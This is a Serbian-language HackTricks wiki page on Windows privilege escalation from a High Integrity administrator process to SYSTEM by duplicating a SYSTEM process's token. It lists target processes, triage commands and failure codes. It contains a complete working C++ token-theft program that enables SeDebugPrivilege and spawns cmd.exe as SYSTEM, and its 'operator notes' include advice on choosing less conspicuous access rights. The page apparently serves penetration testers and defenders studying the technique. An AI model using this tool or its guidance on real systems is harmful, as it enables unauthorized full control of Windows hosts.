# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Ova stranica opisuje **manual** način prelaska sa procesa administratora sa **High Integrity** nivoom na **`NT AUTHORITY\SYSTEM`** tako što se **otvara SYSTEM proces koji nije zaštićen, duplira njegov token i pokreće child proces sa tim tokenom**.

Ako imate samo **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**, ali **ne možete da otvorite odgovarajući SYSTEM proces**, **Potato / named-pipe** putanja je obično pouzdanija:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Ako vam nije potreban samo `SYSTEM`, već **SYSTEM token sa što je moguće više privilegija**, pogledajte i:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Brza trijaža

Pre pokušaja krađe tokena, brzo proverite kontekst:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Praktične napomene:

- **High Integrity** admin token je obično dovoljan da **omogući `SeDebugPrivilege`** i otvori mnoge SYSTEM procese koji nisu zaštićeni.
- **`CreateProcessWithTokenW` zahteva `SeImpersonatePrivilege`** kod pozivaoca. Ako taj API ne uspe sa greškom `1314`, pređite na `CreateProcessAsUserW` nakon što ste već duplirali SYSTEM primary token.
- Na modernom Windows-u, **`lsass.exe` je često loš target** zato što **LSA protection / PPL** blokira pristup čak i administratorima sa `SeDebugPrivilege`. Prednost dajte procesima **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ili ranom **`svchost.exe`** procesu koji radi kao SYSTEM.
- Nemaju svi SYSTEM procesi podjednako koristan token. Ako dobijete SYSTEM, ali primetite da nedostaju privilegije, pokušajte sa drugim SYSTEM procesom umesto da pretpostavite da je tehnika neispravna.

## Pažljivo izaberite PID

Najlakši način da ovo pouzdano funkcioniše jeste da **izaberete SYSTEM proces čiji DACL zaista dozvoljava grupi Administrators da upituje proces i duplira njegov token**.

Dobri kandidati za početno testiranje:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- neke rane instance procesa `svchost.exe` koje rade kao SYSTEM

Podrazumevano izbegavajte:

- `lsass.exe` na hostovima gde je omogućena opcija **RunAsPPL / LSA protection**
- zaštićene / bezbednosno osetljive procese koji vraćaju `Access denied` čak i nakon omogućavanja `SeDebugPrivilege`

Kandidate za procese i njihove token/ACL-ove možete pregledati pomoću alata **Process Explorer** ili **Process Hacker**, pokrenutih sa povišenim privilegijama.

### Code

Sledeći kod je preuzet [odavde](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Omogućava da se **Process ID prosledi kao argument**, nakon čega će biti pokrenut CMD **kao korisnik** navedenog procesa.<sup>[[3]](#references)</sup>\
Ako se pokreće iz procesa sa **High Integrity**, možete **navesti PID procesa koji radi kao System** (kao što su `winlogon` ili `wininit`) i izvršiti `cmd.exe` kao SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Korisne napomene o API-ju / pravima pristupa

Primer koristi `MAXIMUM_ALLOWED`, ali za stvarne operacije korisno je zapamtiti minimalne potrebne stavke:

- `OpenProcessToken()` zahteva samo da **handle procesa** bude otvoren sa **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Za korišćenje `CreateProcessWithTokenW()`, **handle primarnog tokena** mora imati **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` mora kreirati **primarni token** (`TokenPrimary`), a ne samo impersonation token.
- Ako ste se već impersonirali kao SYSTEM, a `CreateProcessWithTokenW()` i dalje ne uspeva sa greškom `1314`, pokušajte umesto toga sa `CreateProcessAsUserW()`.

To znači da je otvaranje ciljnog procesa sa `PROCESS_ALL_ACCESS` obično nepotrebno i upadljivije nego jednostavno zahtevanje prava potrebnih za ispitivanje tokena.

## Greška

U nekim slučajevima možete pokušati da se impersonirate kao SYSTEM, ali to neće raditi i dobićete izlaz poput sledećeg:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
To znači da čak i ako radite na nivou **High Integrity**, **nemate dovoljno dozvola** nad tim ciljnim procesom/tokenom.\
Proverimo trenutne Administrator dozvole nad `svchost.exe` procesima pomoću **Process Explorer**-a (ili možete koristiti i **Process Hacker**):

1. Izaberite proces `svchost.exe`
2. Kliknite desnim tasterom miša --> Properties
3. U kartici "Security" kliknite na dugme "Permissions" u donjem desnom uglu
4. Kliknite na "Advanced"
5. Izaberite "Administrators" i kliknite na "Edit"
6. Kliknite na "Show advanced permissions"

![Code - Greška: 6. Kliknite na "Show advanced permissions"](<../../images/image (437).png>)

Prethodna slika sadrži sve privilegije koje "Administrators" imaju nad izabranim procesom (kao što možete videti, u slučaju `svchost.exe` imaju samo privilegije "Query")

Pogledajte privilegije koje "Administrators" imaju nad `winlogon.exe`:

![Code - Greška: Pogledajte privilegije koje "Administrators" imaju nad winlogon.exe](<../../images/image (1102).png>)

Unutar tog procesa "Administrators" mogu da koriste "Read Memory" i "Read Permissions", što verovatno omogućava Administratorima da impersonate-uju token koji koristi ovaj proces.

### Uobičajeni uzroci neuspeha

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: DACL procesa vas blokira ili je cilj **protected/PPL**. Izaberite drugi SYSTEM proces.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: vaš token handle je otvoren bez dovoljnog nivoa prava ili DACL ciljnog tokena sprečava dupliciranje.
- **`CreateProcessWithTokenW()` -> `1314`**: caller trenutno nema omogućen **`SeImpersonatePrivilege`**. Pokušajte da ga prvo enable-ujete ili koristite `CreateProcessAsUserW()` sa dupliciranim primary tokenom.
- **`CreateProcessWithTokenW()` -> `1326`** nakon prethodnih neuspeha: ovo često samo znači da je raniji korak dupliciranja/impersonation-a tokena neuspešan, pa ne postoji upotrebljiv primary token za pokretanje child procesa.

## Napomene za operatera

- Ova tehnika je odlična kada ste već **local admin + high integrity** i želite brz, ručni put do SYSTEM-a bez pokretanja service-a ili named-pipe coercion lanca.
- U hardenovanim Windows 11 / Server okruženjima, **LSA protection je sve češća**, pa je workflow koji pretpostavlja da je `lsass.exe` uvek čitljiv nepouzdan. **`winlogon.exe` / `wininit.exe` / `services.exe` su obično bolji prvi izbori**.<sup>[[2]](#references)</sup>
- Ako dobijete kontekst **service account**-a umesto elevated admin desktop-a, **Potato family** je obično pogodnija od ove stranice.



## Reference

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Zloupotreba Windows tokena za kompromitovanje Active Directory-ja bez dodirivanja LSASS-a](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Razumevanje i zloupotreba Process Tokena — Deo II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
